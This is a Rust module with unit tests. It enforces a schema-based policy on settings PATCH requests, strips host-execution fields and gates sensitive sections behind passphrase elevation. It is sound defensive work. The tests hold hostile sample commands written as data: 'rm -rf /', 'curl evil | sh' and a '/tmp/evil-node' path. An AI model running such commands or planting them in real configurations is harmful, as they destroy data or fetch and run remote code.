//! Server-side PATCH policy, derived from the schema (#1692).
//!
//! Replaces the hand-kept `ALLOWED_*_SECTIONS`, `SESSION_BLOCKED_FIELDS`, and
//! `ELEVATION_REQUIRED_*` constants in `src/server/api`. The settings PATCH
//! handlers walk each incoming leaf and ask the schema:
//!
//! - is `section.field` a real, known field? (unknown -> 400)
//! - does it need passphrase elevation? (`requires_elevation` and not yet
//!   elevated -> 403)
//! - is the value well-formed? ([`super::validate_value`] -> 400)
//!
//! Host-execution surfaces (`local_only`: `node_path`, agent argv/command,
//! status-hook commands) are stripped from the body by [`strip_local_only`]
//! before validation, so a bundled or echoed-back patch keeps its safe leaves
//! and silently drops the local-only ones. They can never reach disk from the
//! web regardless of how the client framed the request, and the policy is the
//! same schema data the TUI and web render from, so the surfaces cannot drift.
//!
//! Sections absent from the schema (e.g. `hooks`, which runs arbitrary shell
//! commands on session start and bypasses the repo-hook trust prompt) are
//! rejected as unknown, so they remain unreachable from the API.

use serde_json::Value;

use super::{schema, validate_value, FieldDescriptor, WebWritePolicy};

/// Which endpoint a patch arrived on. The per-profile endpoint additionally
/// accepts the top-level `description` string (a profile-only field that has
/// no schema descriptor); the global endpoint rejects it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    Global,
    Profile,
}

/// Why a settings PATCH leaf was rejected. Each variant maps to an HTTP status
/// via [`PatchRejection::status_code`] and a stable `error` code via
/// [`PatchRejection::error_code`].
#[derive(Debug, Clone, PartialEq)]
pub enum PatchRejection {
    /// Top-level key is not a known settings section. 400.
    UnknownSection(String),
    /// `section.field` is not a known field. 400.
    UnknownField(String),
    /// Section value was not a JSON object (or `description` not a string). 400.
    Malformed(String),
    /// Field needs passphrase elevation the caller has not provided. 403.
    NeedsElevation { path: String, reason: String },
    /// Value failed server-authoritative validation. 400.
    Invalid { path: String, reason: String },
}

impl PatchRejection {
    /// HTTP status: unknown/malformed/invalid are client errors (400);
    /// elevation is an authorization failure (403).
    pub fn status_code(&self) -> u16 {
        match self {
            PatchRejection::NeedsElevation { .. } => 403,
            _ => 400,
        }
    }

    /// Stable machine-readable error code for the JSON body. `elevation_required`
    /// matches the shape the web client's interceptor already keys on to fire
    /// the passphrase prompt.
    pub fn error_code(&self) -> &'static str {
        match self {
            PatchRejection::NeedsElevation { .. } => "elevation_required",
            _ => "validation_failed",
        }
    }

    /// Human-readable message surfaced to the client.
    pub fn message(&self) -> String {
        match self {
            PatchRejection::UnknownSection(s) => {
                format!("Settings section '{s}' is not allowed via the web API.")
            }
            PatchRejection::UnknownField(p) => {
                format!("Settings field '{p}' is not a known setting.")
            }
            PatchRejection::Malformed(s) => {
                format!("Settings section '{s}' has a malformed value.")
            }
            PatchRejection::NeedsElevation { .. } => "Re-enter the passphrase to continue".into(),
            PatchRejection::Invalid { path, reason } => {
                format!("Field '{path}' is invalid: {reason}")
            }
        }
    }
}

/// Look up `section.field`, or `None` if the section/field pair is unknown.
fn lookup(section: &str, field: &str) -> Option<FieldDescriptor> {
    schema()
        .into_iter()
        .find(|d| d.section == section && d.field == field)
}

/// True if `section` is a known schema section (has at least one field).
fn section_exists(section: &str) -> bool {
    schema().iter().any(|d| d.section == section)
}

/// Remove every `local_only` leaf from a PATCH body in place, before validation
/// and merge. A bundled or echoed-back patch that includes a host-execution
/// surface (`node_path`, agent argv/command, status-hook commands) keeps its
/// safe leaves and silently drops the local-only ones, so the safe edit still
/// persists. These fields can never reach disk from the web regardless of how
/// the client framed the request. Unknown fields are left for `validate_patch`
/// to reject.
pub fn strip_local_only(patch: &mut Value) {
    let Some(obj) = patch.as_object_mut() else {
        return;
    };
    for (section, value) in obj.iter_mut() {
        let Some(fields) = value.as_object_mut() else {
            continue;
        };
        fields.retain(|field, _| {
            !matches!(
                lookup(section, field).map(|d| d.web_write),
                Some(WebWritePolicy::LocalOnly { .. })
            )
        });
    }
}

/// Validate every leaf of a settings PATCH body against the schema. Returns the
/// first rejection encountered, or `Ok(())` if every leaf is a known field the
/// web may write (given `elevated`) carrying a well-formed value. A `null` leaf
/// is an override-clear request and skips value validation.
///
/// Call [`strip_local_only`] first: this function does not special-case the
/// `local_only` policy (host-execution surfaces are removed before they get
/// here), it only gates unknown fields, elevation, and value validity.
pub fn validate_patch(patch: &Value, scope: Scope, elevated: bool) -> Result<(), PatchRejection> {
    let Some(obj) = patch.as_object() else {
        return Err(PatchRejection::Malformed("<root>".into()));
    };
    for (section, value) in obj {
        // `description` is a profile-only top-level string with no descriptor.
        if section == "description" {
            if scope == Scope::Profile && value.is_string() {
                continue;
            }
            return Err(PatchRejection::UnknownSection(section.clone()));
        }
        if !section_exists(section) {
            return Err(PatchRejection::UnknownSection(section.clone()));
        }
        let Some(fields) = value.as_object() else {
            return Err(PatchRejection::Malformed(section.clone()));
        };
        for (field, val) in fields {
            let path = format!("{section}.{field}");
            let Some(d) = lookup(section, field) else {
                return Err(PatchRejection::UnknownField(path));
            };
            if let WebWritePolicy::RequiresElevation { reason } = &d.web_write {
                if !elevated {
                    return Err(PatchRejection::NeedsElevation {
                        path,
                        reason: reason.clone(),
                    });
                }
            }
            // A null leaf clears a profile override; nothing to validate.
            if val.is_null() {
                continue;
            }
            if let Err(e) = validate_value(&d.validation, val) {
                return Err(PatchRejection::Invalid {
                    path,
                    reason: e.reason,
                });
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn unknown_section_rejected() {
        let err = validate_patch(&json!({"nope": {"x": 1}}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownSection(_)));
        assert_eq!(err.status_code(), 400);
    }

    #[test]
    fn hooks_section_is_not_writable() {
        // `hooks` (HooksConfig) runs arbitrary shell commands on session start
        // and bypasses the repo-hook trust prompt. It has no schema descriptor,
        // so it must be rejected as an unknown section on every endpoint. This
        // is the load-bearing invariant the old `ALLOWED_*` pins protected.
        for scope in [Scope::Global, Scope::Profile] {
            let err = validate_patch(&json!({"hooks": {"on_start": "rm -rf /"}}), scope, true)
                .unwrap_err();
            assert!(
                matches!(err, PatchRejection::UnknownSection(ref s) if s == "hooks"),
                "hooks must be rejected as unknown on {scope:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn unknown_field_rejected() {
        let err = validate_patch(&json!({"session": {"made_up": true}}), Scope::Global, true)
            .unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownField(ref p) if p == "session.made_up"));
    }

    #[test]
    fn agent_command_fields_are_stripped() {
        // The agent-command tamper surface (binary override, argv, custom
        // agents, detect-as, acp cmd) is `local_only`: stripped from the
        // body before merge so it can never reach disk from the web. Replaces
        // SESSION_BLOCKED_FIELDS.
        for field in [
            "agent_command_override",
            "agent_extra_args",
            "custom_agents",
            "agent_detect_as",
            "agent_acp_cmd",
        ] {
            let mut body = json!({"session": {field: {"claude": "x"}, "yolo_mode_default": true}});
            strip_local_only(&mut body);
            assert!(
                body["session"].get(field).is_none(),
                "session.{field} must be stripped, body: {body}"
            );
            // The safe sibling survives and the stripped body still validates.
            assert_eq!(body["session"]["yolo_mode_default"], json!(true));
            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
        }
    }

    #[test]
    fn status_hook_commands_are_stripped() {
        // Status-hook commands run a local shell on every status change: a
        // host-execution surface stripped before merge, even though the
        // section's enabled/debounce toggles persist.
        let mut body = json!({"status_hooks": {
            "on_running": "curl evil | sh",
            "on_idle": "x",
            "on_change": "y",
            "enabled": true,
            "debounce_ms": 250,
        }});
        strip_local_only(&mut body);
        for field in ["on_running", "on_idle", "on_change"] {
            assert!(
                body["status_hooks"].get(field).is_none(),
                "status_hooks.{field} must be stripped, body: {body}"
            );
        }
        assert_eq!(body["status_hooks"]["enabled"], json!(true));
        assert_eq!(body["status_hooks"]["debounce_ms"], json!(250));
        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
    }

    #[test]
    fn sandbox_and_worktree_require_elevation() {
        // The persisted-tamper surfaces (image, mounts, templates) demand a
        // passphrase: unelevated callers get 403 elevation_required. Replaces
        // ELEVATION_REQUIRED_SECTIONS.
        for body in [
            json!({"sandbox": {"default_image": "alpine"}}),
            json!({"worktree": {"path_template": "{repo}-{branch}"}}),
        ] {
            let err = validate_patch(&body, Scope::Profile, false).unwrap_err();
            assert!(
                matches!(err, PatchRejection::NeedsElevation { .. }),
                "{body} should need elevation, got {err:?}"
            );
            assert_eq!(err.error_code(), "elevation_required");
            // Elevated callers pass.
            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
        }
    }

    #[test]
    fn safe_sections_need_no_elevation() {
        // Theme, sound, updates, web, logging, description and safe session
        // fields all save without a passphrase re-prompt, even unelevated (the
        // load-bearing UX of #1510).
        for body in [
            json!({"theme": {"idle_decay_minutes": 5}}),
            json!({"updates": {"notify_in_cli": true}}),
            json!({"web": {"notify_on_idle": true}}),
            json!({"session": {"yolo_mode_default": true, "strict_hotkeys": false}}),
            json!({"description": "my profile"}),
        ] {
            assert!(
                validate_patch(&body, Scope::Profile, false).is_ok(),
                "{body} should validate unelevated"
            );
        }
    }

    #[test]
    fn description_is_profile_only() {
        assert!(validate_patch(&json!({"description": "x"}), Scope::Profile, true).is_ok());
        let err = validate_patch(&json!({"description": "x"}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::UnknownSection(ref s) if s == "description"));
    }

    #[test]
    fn invalid_value_rejected() {
        // default_agent is NonEmptyString.
        let err = validate_patch(
            &json!({"acp": {"default_agent": "  "}}),
            Scope::Global,
            true,
        )
        .unwrap_err();
        assert!(matches!(err, PatchRejection::Invalid { .. }));
        assert_eq!(err.status_code(), 400);
    }

    #[test]
    fn null_leaf_clears_without_validation() {
        // A null clears a profile override; it must pass validation even for a
        // field whose normal validation would reject null.
        assert!(validate_patch(
            &json!({"acp": {"default_agent": null}}),
            Scope::Profile,
            true
        )
        .is_ok());
    }

    #[test]
    fn acp_is_now_web_writable_except_node_path() {
        // The single-source fix: acp settings are reachable from the web
        // (the old curated allowlist rejected the whole section). A bundled
        // patch keeps the safe knob and silently drops the local_only
        // node_path (matches the ACP_BLOCKED_FIELDS strip contract).
        let mut body = json!({"acp": {"show_tool_durations": true, "node_path": "/tmp/evil-node"}});
        strip_local_only(&mut body);
        assert!(body["acp"].get("node_path").is_none());
        assert_eq!(body["acp"]["show_tool_durations"], json!(true));
        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
    }

    #[test]
    fn malformed_section_value_rejected() {
        let err =
            validate_patch(&json!({"theme": "not-an-object"}), Scope::Global, true).unwrap_err();
        assert!(matches!(err, PatchRejection::Malformed(_)));
    }
}
